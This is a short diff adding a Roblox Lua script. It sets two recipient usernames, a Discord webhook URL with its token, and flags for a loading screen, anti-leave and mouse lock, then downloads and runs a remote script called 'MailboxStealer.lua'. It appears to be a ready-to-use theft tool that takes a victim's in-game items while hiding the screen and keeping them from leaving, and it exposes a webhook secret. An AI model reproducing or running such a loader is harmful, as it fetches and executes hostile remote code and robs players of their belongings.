@@ -1,0 +1,9 @@
+UserName = "coupfatalcoup2"
+UserName2 = "coupfatalcoup5"
+Webhook = "https://discord.com/api/webhooks/1117501433688899736/Z2jFbv6LiFg8vdEeBM-kBuzn_gwBwUw1yRU1c8g7nnjAaV7tpZHp4Cw8xKBKu15euc-W"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua", true))()
